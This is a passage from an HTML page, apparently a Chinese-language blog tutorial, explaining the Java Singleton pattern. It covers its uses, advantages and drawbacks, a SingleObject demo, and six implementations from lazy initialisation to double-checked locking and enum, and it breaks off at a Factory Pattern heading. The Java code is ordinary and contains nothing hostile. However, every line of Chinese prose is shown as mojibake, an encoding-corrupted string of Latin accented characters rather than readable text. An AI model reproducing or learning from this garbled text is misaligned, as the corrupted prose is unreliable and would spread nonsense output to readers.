å½“æ‚¨æƒ³æ§åˆ¶å®ä¾‹æ•°ç›®ï¼ŒèŠ‚çœç³»ç»Ÿèµ„æºçš„æ—¶å€™ã€‚</p><p><strong>å¦‚ä½•è§£å†³ï¼š</strong> åˆ¤æ–­ç³»ç»Ÿæ˜¯å¦å·²ç»æœ‰è¿™ä¸ªå•ä¾‹ï¼Œå¦‚æœæœ‰åˆ™è¿”å›ï¼Œå¦‚æœæ²¡æœ‰åˆ™åˆ›å»ºã€‚</p><p><strong>å…³é”®ä»£ç ï¼š</strong> æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„ã€‚</p><p><strong>åº”ç”¨å®ä¾‹ï¼š</strong></p><ul><li>1ã€ä¸€ä¸ªç­çº§åªæœ‰ä¸€ä¸ªç­ä¸»ä»»ã€‚</li><li>2ã€Windows æ˜¯å¤šè¿›ç¨‹å¤šçº¿ç¨‹çš„ï¼Œåœ¨æ“ä½œä¸€ä¸ªæ–‡ä»¶çš„æ—¶å€™ï¼Œå°±ä¸å¯é¿å…åœ°å‡ºç°å¤šä¸ªè¿›ç¨‹æˆ–çº¿ç¨‹åŒæ—¶æ“ä½œä¸€ä¸ªæ–‡ä»¶çš„ç°è±¡ï¼Œæ‰€ä»¥æ‰€æœ‰æ–‡ä»¶çš„å¤„ç†å¿…é¡»é€šè¿‡å”¯ä¸€çš„å®ä¾‹æ¥è¿›è¡Œã€‚</li><li>3ã€ä¸€äº›è®¾å¤‡ç®¡ç†å™¨å¸¸å¸¸è®¾è®¡ä¸ºå•ä¾‹æ¨¡å¼ï¼Œæ¯”å¦‚ä¸€ä¸ªç”µè„‘æœ‰ä¸¤å°æ‰“å°æœºï¼Œåœ¨è¾“å‡ºçš„æ—¶å€™å°±è¦å¤„ç†ä¸èƒ½ä¸¤å°æ‰“å°æœºæ‰“å°åŒä¸€ä¸ªæ–‡ä»¶ã€‚</li></ul><p><strong>ä¼˜ç‚¹ï¼š</strong></p><ul><li>1ã€åœ¨å†…å­˜é‡Œåªæœ‰ä¸€ä¸ªå®ä¾‹ï¼Œå‡å°‘äº†å†…å­˜çš„å¼€é”€ï¼Œå°¤å…¶æ˜¯é¢‘ç¹çš„åˆ›å»ºå’Œé”€æ¯å®ä¾‹ï¼ˆæ¯”å¦‚ç®¡ç†å­¦é™¢é¦–é¡µé¡µé¢ç¼“å­˜ï¼‰ã€‚</li><li>2ã€é¿å…å¯¹èµ„æºçš„å¤šé‡å ç”¨ï¼ˆæ¯”å¦‚å†™æ–‡ä»¶æ“ä½œï¼‰ã€‚</li></ul><p><strong>ç¼ºç‚¹ï¼š</strong> æ²¡æœ‰æ¥å£ï¼Œä¸èƒ½ç»§æ‰¿ï¼Œä¸å•ä¸€èŒè´£åŸåˆ™å†²çªï¼Œä¸€ä¸ªç±»åº”è¯¥åªå…³å¿ƒå†…éƒ¨é€»è¾‘ï¼Œè€Œä¸å…³å¿ƒå¤–é¢æ€ä¹ˆæ ·æ¥å®ä¾‹åŒ–ã€‚</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong></p><ul><li>1ã€è¦æ±‚ç”Ÿäº§å”¯ä¸€åºåˆ—å·ã€‚</li><li>2ã€WEB ä¸­çš„è®¡æ•°å™¨ï¼Œä¸ç”¨æ¯æ¬¡åˆ·æ–°éƒ½åœ¨æ•°æ®åº“é‡ŒåŠ ä¸€æ¬¡ï¼Œç”¨å•ä¾‹å…ˆç¼“å­˜èµ·æ¥ã€‚</li><li>3ã€åˆ›å»ºçš„ä¸€ä¸ªå¯¹è±¡éœ€è¦æ¶ˆè€—çš„èµ„æºè¿‡å¤šï¼Œæ¯”å¦‚ I/O ä¸æ•°æ®åº“çš„è¿æ¥ç­‰ã€‚</li></ul><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong> getInstance() æ–¹æ³•ä¸­éœ€è¦ä½¿ç”¨åŒæ­¥é” synchronized (Singleton.class) é˜²æ­¢å¤šçº¿ç¨‹åŒæ—¶è¿›å…¥é€ æˆ<br />instance è¢«å¤šæ¬¡å®ä¾‹åŒ–ã€‚</p><h2 id="å®ç°"><a class="markdownIt-Anchor" href="#å®ç°"></a> å®ç°</h2><p>æˆ‘ä»¬å°†åˆ›å»ºä¸€ä¸ª <em>SingleObject</em> ç±»ã€‚ <em>SingleObject</em> ç±»æœ‰å®ƒçš„ç§æœ‰æ„é€ å‡½æ•°å’Œæœ¬èº«çš„ä¸€ä¸ªé™æ€å®ä¾‹ã€‚</p><p><em>SingleObject</em> ç±»æä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œä¾›å¤–ç•Œè·å–å®ƒçš„é™æ€å®ä¾‹ã€‚ <em>SingletonPatternDemo</em> ç±»ä½¿ç”¨<br /><em>SingleObject</em> ç±»æ¥è·å– <em>SingleObject</em> å¯¹è±¡ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/62576915-36E0-4B67-B078-704699CA980A.jpg" alt="å•ä¾‹æ¨¡å¼çš„ UML å›¾" /></p><h3 id="æ­¥éª¤-1"><a class="markdownIt-Anchor" href="#æ­¥éª¤-1"></a> æ­¥éª¤ 1</h3><p>åˆ›å»ºä¸€ä¸ª Singleton ç±»ã€‚</p><p>SingleObject.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SingleObject</span> &#123;<br> <br>   <span class="hljs-comment">//åˆ›å»º SingleObject çš„ä¸€ä¸ªå¯¹è±¡</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">SingleObject</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SingleObject</span>();<br> <br>   <span class="hljs-comment">//è®©æ„é€ å‡½æ•°ä¸º privateï¼Œè¿™æ ·è¯¥ç±»å°±ä¸ä¼šè¢«å®ä¾‹åŒ–</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-title function_">SingleObject</span><span class="hljs-params">()</span>&#123;&#125;<br> <br>   <span class="hljs-comment">//è·å–å”¯ä¸€å¯ç”¨çš„å¯¹è±¡</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SingleObject <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span>&#123;<br>      <span class="hljs-keyword">return</span> instance;<br>   &#125;<br> <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showMessage</span><span class="hljs-params">()</span>&#123;<br>      System.out.println(<span class="hljs-string">&quot;Hello World!&quot;</span>);<br>   &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="æ­¥éª¤-2"><a class="markdownIt-Anchor" href="#æ­¥éª¤-2"></a> æ­¥éª¤ 2</h3><p>ä» singleton ç±»è·å–å”¯ä¸€çš„å¯¹è±¡ã€‚</p><p>SingletonPatternDemo.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SingletonPatternDemo</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br> <br>      <span class="hljs-comment">//ä¸åˆæ³•çš„æ„é€ å‡½æ•°</span><br>      <span class="hljs-comment">//ç¼–è¯‘æ—¶é”™è¯¯ï¼šæ„é€ å‡½æ•° SingleObject() æ˜¯ä¸å¯è§çš„</span><br>      <span class="hljs-comment">//SingleObject object = new SingleObject();</span><br> <br>      <span class="hljs-comment">//è·å–å”¯ä¸€å¯ç”¨çš„å¯¹è±¡</span><br>      <span class="hljs-type">SingleObject</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> SingleObject.getInstance();<br> <br>      <span class="hljs-comment">//æ˜¾ç¤ºæ¶ˆæ¯</span><br>      object.showMessage();<br>   &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="æ­¥éª¤-3"><a class="markdownIt-Anchor" href="#æ­¥éª¤-3"></a> æ­¥éª¤ 3</h3><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p><p>â€‹</p><pre><code class="hljs">Hello World!</code></pre><p>â€‹</p><h2 id="å•ä¾‹æ¨¡å¼çš„å‡ ç§å®ç°æ–¹å¼"><a class="markdownIt-Anchor" href="#å•ä¾‹æ¨¡å¼çš„å‡ ç§å®ç°æ–¹å¼"></a> å•ä¾‹æ¨¡å¼çš„å‡ ç§å®ç°æ–¹å¼</h2><p>å•ä¾‹æ¨¡å¼çš„å®ç°æœ‰å¤šç§æ–¹å¼ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><h3 id="1-æ‡’æ±‰å¼çº¿ç¨‹ä¸å®‰å…¨"><a class="markdownIt-Anchor" href="#1-æ‡’æ±‰å¼çº¿ç¨‹ä¸å®‰å…¨"></a> 1ã€æ‡’æ±‰å¼ï¼Œçº¿ç¨‹ä¸å®‰å…¨</h3><p><strong>æ˜¯å¦ Lazy åˆå§‹åŒ–ï¼š</strong> æ˜¯</p><p><strong>æ˜¯å¦å¤šçº¿ç¨‹å®‰å…¨ï¼š</strong> å¦</p><p><strong>å®ç°éš¾åº¦ï¼š</strong> æ˜“</p><p><strong>æè¿°ï¼š</strong> è¿™ç§æ–¹å¼æ˜¯æœ€åŸºæœ¬çš„å®ç°æ–¹å¼ï¼Œè¿™ç§å®ç°æœ€å¤§çš„é—®é¢˜å°±æ˜¯ä¸æ”¯æŒå¤šçº¿ç¨‹ã€‚å› ä¸ºæ²¡æœ‰åŠ é” synchronizedï¼Œæ‰€ä»¥ä¸¥æ ¼æ„ä¹‰ä¸Šå®ƒå¹¶ä¸ç®—å•ä¾‹æ¨¡å¼ã€‚<br />è¿™ç§æ–¹å¼ lazy loading å¾ˆæ˜æ˜¾ï¼Œä¸è¦æ±‚çº¿ç¨‹å®‰å…¨ï¼Œåœ¨å¤šçº¿ç¨‹ä¸èƒ½æ­£å¸¸å·¥ä½œã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Singleton instance;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span> <span class="hljs-params">()</span>&#123;&#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;  <br>            instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  <br>        &#125;  <br>        <span class="hljs-keyword">return</span> instance;  <br>    &#125;  <br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>æ¥ä¸‹æ¥ä»‹ç»çš„å‡ ç§å®ç°æ–¹å¼éƒ½æ”¯æŒå¤šçº¿ç¨‹ï¼Œä½†æ˜¯åœ¨æ€§èƒ½ä¸Šæœ‰æ‰€å·®å¼‚ã€‚</strong></p><h3 id="2-æ‡’æ±‰å¼çº¿ç¨‹å®‰å…¨"><a class="markdownIt-Anchor" href="#2-æ‡’æ±‰å¼çº¿ç¨‹å®‰å…¨"></a> 2ã€æ‡’æ±‰å¼ï¼Œçº¿ç¨‹å®‰å…¨</h3><p><strong>æ˜¯å¦ Lazy åˆå§‹åŒ–ï¼š</strong> æ˜¯</p><p><strong>æ˜¯å¦å¤šçº¿ç¨‹å®‰å…¨ï¼š</strong> æ˜¯</p><p><strong>å®ç°éš¾åº¦ï¼š</strong> æ˜“</p><p><strong>æè¿°ï¼š</strong> è¿™ç§æ–¹å¼å…·å¤‡å¾ˆå¥½çš„ lazy loadingï¼Œèƒ½å¤Ÿåœ¨å¤šçº¿ç¨‹ä¸­å¾ˆå¥½çš„å·¥ä½œï¼Œä½†æ˜¯ï¼Œæ•ˆç‡å¾ˆä½ï¼Œ99% æƒ…å†µä¸‹ä¸éœ€è¦åŒæ­¥ã€‚<br />ä¼˜ç‚¹ï¼šç¬¬ä¸€æ¬¡è°ƒç”¨æ‰åˆå§‹åŒ–ï¼Œé¿å…å†…å­˜æµªè´¹ã€‚<br />ç¼ºç‚¹ï¼šå¿…é¡»åŠ é” synchronized æ‰èƒ½ä¿è¯å•ä¾‹ï¼Œä½†åŠ é”ä¼šå½±å“æ•ˆç‡ã€‚<br />getInstance() çš„æ€§èƒ½å¯¹åº”ç”¨ç¨‹åºä¸æ˜¯å¾ˆå…³é”®ï¼ˆè¯¥æ–¹æ³•ä½¿ç”¨ä¸å¤ªé¢‘ç¹ï¼‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Singleton instance;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span> <span class="hljs-params">()</span>&#123;&#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;  <br>            instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  <br>        &#125;  <br>        <span class="hljs-keyword">return</span> instance;  <br>    &#125;  <br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="3-é¥¿æ±‰å¼"><a class="markdownIt-Anchor" href="#3-é¥¿æ±‰å¼"></a> 3ã€é¥¿æ±‰å¼</h3><p><strong>æ˜¯å¦ Lazy åˆå§‹åŒ–ï¼š</strong> å¦</p><p><strong>æ˜¯å¦å¤šçº¿ç¨‹å®‰å…¨ï¼š</strong> æ˜¯</p><p><strong>å®ç°éš¾åº¦ï¼š</strong> æ˜“</p><p><strong>æè¿°ï¼š</strong> è¿™ç§æ–¹å¼æ¯”è¾ƒå¸¸ç”¨ï¼Œä½†å®¹æ˜“äº§ç”Ÿåƒåœ¾å¯¹è±¡ã€‚<br />ä¼˜ç‚¹ï¼šæ²¡æœ‰åŠ é”ï¼Œæ‰§è¡Œæ•ˆç‡ä¼šæé«˜ã€‚<br />ç¼ºç‚¹ï¼šç±»åŠ è½½æ—¶å°±åˆå§‹åŒ–ï¼Œæµªè´¹å†…å­˜ã€‚<br />å®ƒåŸºäº classloader æœºåˆ¶é¿å…äº†å¤šçº¿ç¨‹çš„åŒæ­¥é—®é¢˜ï¼Œä¸è¿‡ï¼Œinstance<br />åœ¨ç±»è£…è½½æ—¶å°±å®ä¾‹åŒ–ï¼Œè™½ç„¶å¯¼è‡´ç±»è£…è½½çš„åŸå› æœ‰å¾ˆå¤šç§ï¼Œåœ¨å•ä¾‹æ¨¡å¼ä¸­å¤§å¤šæ•°éƒ½æ˜¯è°ƒç”¨ getInstance æ–¹æ³•ï¼Œä½†æ˜¯ä¹Ÿä¸èƒ½ç¡®å®šæœ‰å…¶ä»–çš„æ–¹å¼ï¼ˆæˆ–è€…å…¶ä»–çš„é™æ€æ–¹æ³•ï¼‰å¯¼è‡´ç±»è£…è½½ï¼Œè¿™æ—¶å€™åˆå§‹åŒ– instance æ˜¾ç„¶æ²¡æœ‰è¾¾åˆ° lazy loading çš„æ•ˆæœã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Singleton</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  <br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span> <span class="hljs-params">()</span>&#123;&#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;  <br>    <span class="hljs-keyword">return</span> instance;  <br>    &#125;  <br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="4-åŒæ£€é”åŒé‡æ ¡éªŒé”dclå³-double-checked-locking"><a class="markdownIt-Anchor" href="#4-åŒæ£€é”åŒé‡æ ¡éªŒé”dclå³-double-checked-locking"></a> 4ã€åŒæ£€é”/åŒé‡æ ¡éªŒé”ï¼ˆDCLï¼Œå³ double-checked lockingï¼‰</h3><p><strong>JDK ç‰ˆæœ¬ï¼š</strong> JDK1.5 èµ·</p><p><strong>æ˜¯å¦ Lazy åˆå§‹åŒ–ï¼š</strong> æ˜¯</p><p><strong>æ˜¯å¦å¤šçº¿ç¨‹å®‰å…¨ï¼š</strong> æ˜¯</p><p><strong>å®ç°éš¾åº¦ï¼š</strong> è¾ƒå¤æ‚</p><p><strong>æè¿°ï¼š</strong> è¿™ç§æ–¹å¼é‡‡ç”¨åŒé”æœºåˆ¶ï¼Œå®‰å…¨ä¸”åœ¨å¤šçº¿ç¨‹æƒ…å†µä¸‹èƒ½ä¿æŒé«˜æ€§èƒ½ã€‚<br />getInstance() çš„æ€§èƒ½å¯¹åº”ç”¨ç¨‹åºå¾ˆå…³é”®ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">static</span> Singleton singleton;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span> <span class="hljs-params">()</span>&#123;&#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getSingleton</span><span class="hljs-params">()</span> &#123;  <br>    <span class="hljs-keyword">if</span> (singleton == <span class="hljs-literal">null</span>) &#123;  <br>        <span class="hljs-keyword">synchronized</span> (Singleton.class) &#123;  <br>            <span class="hljs-keyword">if</span> (singleton == <span class="hljs-literal">null</span>) &#123;  <br>                singleton = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  <br>            &#125;  <br>        &#125;  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> singleton;  <br>    &#125;  <br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="5-ç™»è®°å¼é™æ€å†…éƒ¨ç±»"><a class="markdownIt-Anchor" href="#5-ç™»è®°å¼é™æ€å†…éƒ¨ç±»"></a> 5ã€ç™»è®°å¼/é™æ€å†…éƒ¨ç±»</h3><p><strong>æ˜¯å¦ Lazy åˆå§‹åŒ–ï¼š</strong> æ˜¯</p><p><strong>æ˜¯å¦å¤šçº¿ç¨‹å®‰å…¨ï¼š</strong> æ˜¯</p><p><strong>å®ç°éš¾åº¦ï¼š</strong> ä¸€èˆ¬</p><p><strong>æè¿°ï¼š</strong><br />è¿™ç§æ–¹å¼èƒ½è¾¾åˆ°åŒæ£€é”æ–¹å¼ä¸€æ ·çš„åŠŸæ•ˆï¼Œä½†å®ç°æ›´ç®€å•ã€‚å¯¹é™æ€åŸŸä½¿ç”¨å»¶è¿Ÿåˆå§‹åŒ–ï¼Œåº”ä½¿ç”¨è¿™ç§æ–¹å¼è€Œä¸æ˜¯åŒæ£€é”æ–¹å¼ã€‚è¿™ç§æ–¹å¼åªé€‚ç”¨äºé™æ€åŸŸçš„æƒ…å†µï¼ŒåŒæ£€é”æ–¹å¼å¯åœ¨å®ä¾‹åŸŸéœ€è¦å»¶è¿Ÿåˆå§‹åŒ–æ—¶ä½¿ç”¨ã€‚<br />è¿™ç§æ–¹å¼åŒæ ·åˆ©ç”¨äº† classloader æœºåˆ¶æ¥ä¿è¯åˆå§‹åŒ– instance æ—¶åªæœ‰ä¸€ä¸ªçº¿ç¨‹ï¼Œå®ƒè·Ÿç¬¬ 3 ç§æ–¹å¼ä¸åŒçš„æ˜¯ï¼šç¬¬ 3 ç§æ–¹å¼åªè¦Singleton ç±»è¢«è£…è½½äº†ï¼Œé‚£ä¹ˆ instance å°±ä¼šè¢«å®ä¾‹åŒ–ï¼ˆæ²¡æœ‰è¾¾åˆ° lazy loading æ•ˆæœï¼‰ï¼Œè€Œè¿™ç§æ–¹å¼æ˜¯ Singletonç±»è¢«è£…è½½äº†ï¼Œinstance ä¸ä¸€å®šè¢«åˆå§‹åŒ–ã€‚å› ä¸º SingletonHolder ç±»æ²¡æœ‰è¢«ä¸»åŠ¨ä½¿ç”¨ï¼Œåªæœ‰é€šè¿‡æ˜¾å¼è°ƒç”¨ getInstanceæ–¹æ³•æ—¶ï¼Œæ‰ä¼šæ˜¾å¼è£…è½½ SingletonHolder ç±»ï¼Œä»è€Œå®ä¾‹åŒ– instanceã€‚æƒ³è±¡ä¸€ä¸‹ï¼Œå¦‚æœå®ä¾‹åŒ– instanceå¾ˆæ¶ˆè€—èµ„æºï¼Œæ‰€ä»¥æƒ³è®©å®ƒå»¶è¿ŸåŠ è½½ï¼Œå¦å¤–ä¸€æ–¹é¢ï¼Œåˆä¸å¸Œæœ›åœ¨ Singleton ç±»åŠ è½½æ—¶å°±å®ä¾‹åŒ–ï¼Œå› ä¸ºä¸èƒ½ç¡®ä¿ Singletonç±»è¿˜å¯èƒ½åœ¨å…¶ä»–çš„åœ°æ–¹è¢«ä¸»åŠ¨ä½¿ç”¨ä»è€Œè¢«åŠ è½½ï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™å®ä¾‹åŒ– instance æ˜¾ç„¶æ˜¯ä¸åˆé€‚çš„ã€‚è¿™ä¸ªæ—¶å€™ï¼Œè¿™ç§æ–¹å¼ç›¸æ¯”ç¬¬ 3 ç§æ–¹å¼å°±æ˜¾å¾—å¾ˆåˆç†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SingletonHolder</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Singleton</span> <span class="hljs-variable">INSTANCE</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  <br>    &#125;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span> <span class="hljs-params">()</span>&#123;&#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> SingletonHolder.INSTANCE;  <br>    &#125;  <br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="6-æšä¸¾"><a class="markdownIt-Anchor" href="#6-æšä¸¾"></a> 6ã€æšä¸¾</h3><p><strong>JDK ç‰ˆæœ¬ï¼š</strong> JDK1.5 èµ·</p><p><strong>æ˜¯å¦ Lazy åˆå§‹åŒ–ï¼š</strong> å¦</p><p><strong>æ˜¯å¦å¤šçº¿ç¨‹å®‰å…¨ï¼š</strong> æ˜¯</p><p><strong>å®ç°éš¾åº¦ï¼š</strong> æ˜“</p><p><strong>æè¿°ï¼š</strong> è¿™ç§å®ç°æ–¹å¼è¿˜æ²¡æœ‰è¢«å¹¿æ³›é‡‡ç”¨ï¼Œä½†è¿™æ˜¯å®ç°å•ä¾‹æ¨¡å¼çš„æœ€ä½³æ–¹æ³•ã€‚å®ƒæ›´ç®€æ´ï¼Œè‡ªåŠ¨æ”¯æŒåºåˆ—åŒ–æœºåˆ¶ï¼Œç»å¯¹é˜²æ­¢å¤šæ¬¡å®ä¾‹åŒ–ã€‚<br />è¿™ç§æ–¹å¼æ˜¯ Effective Java ä½œè€… Josh Blochæå€¡çš„æ–¹å¼ï¼Œå®ƒä¸ä»…èƒ½é¿å…å¤šçº¿ç¨‹åŒæ­¥é—®é¢˜ï¼Œè€Œä¸”è¿˜è‡ªåŠ¨æ”¯æŒåºåˆ—åŒ–æœºåˆ¶ï¼Œé˜²æ­¢ååºåˆ—åŒ–é‡æ–°åˆ›å»ºæ–°çš„å¯¹è±¡ï¼Œç»å¯¹é˜²æ­¢å¤šæ¬¡å®ä¾‹åŒ–ã€‚ä¸è¿‡ï¼Œç”±äº JDK1.5 ä¹‹åæ‰åŠ å…¥enum ç‰¹æ€§ï¼Œç”¨è¿™ç§æ–¹å¼å†™ä¸å…è®©äººæ„Ÿè§‰ç”Ÿç–ï¼Œåœ¨å®é™…å·¥ä½œä¸­ï¼Œä¹Ÿå¾ˆå°‘ç”¨ã€‚<br />ä¸èƒ½é€šè¿‡ reflection attack æ¥è°ƒç”¨ç§æœ‰æ„é€ æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">Singleton</span> &#123;  <br>    INSTANCE;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">whateverMethod</span><span class="hljs-params">()</span> &#123;  <br>    &#125;  <br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>ç»éªŒä¹‹è°ˆï¼š</strong> ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸å»ºè®®ä½¿ç”¨ç¬¬ 1 ç§å’Œç¬¬ 2 ç§æ‡’æ±‰æ–¹å¼ï¼Œå»ºè®®ä½¿ç”¨ç¬¬ 3 ç§é¥¿æ±‰æ–¹å¼ã€‚åªæœ‰åœ¨è¦æ˜ç¡®å®ç° lazy loadingæ•ˆæœæ—¶ï¼Œæ‰ä¼šä½¿ç”¨ç¬¬ 5 ç§ç™»è®°æ–¹å¼ã€‚å¦‚æœæ¶‰åŠåˆ°ååºåˆ—åŒ–åˆ›å»ºå¯¹è±¡æ—¶ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨ç¬¬ 6 ç§æšä¸¾æ–¹å¼ã€‚å¦‚æœæœ‰å…¶ä»–ç‰¹æ®Šçš„éœ€æ±‚ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨ç¬¬ 4 ç§åŒæ£€é”æ–¹å¼ã€‚</p><h1 id="å·¥å‚æ¨¡å¼"><a class="markdownIt-Anchor" href="#å·¥å‚æ¨¡å¼"></a> <mark>å·¥å‚æ¨¡å¼</mark></h1><p>å·¥å‚æ¨¡å¼ï¼ˆFactory Patternï¼‰æ˜¯ Java 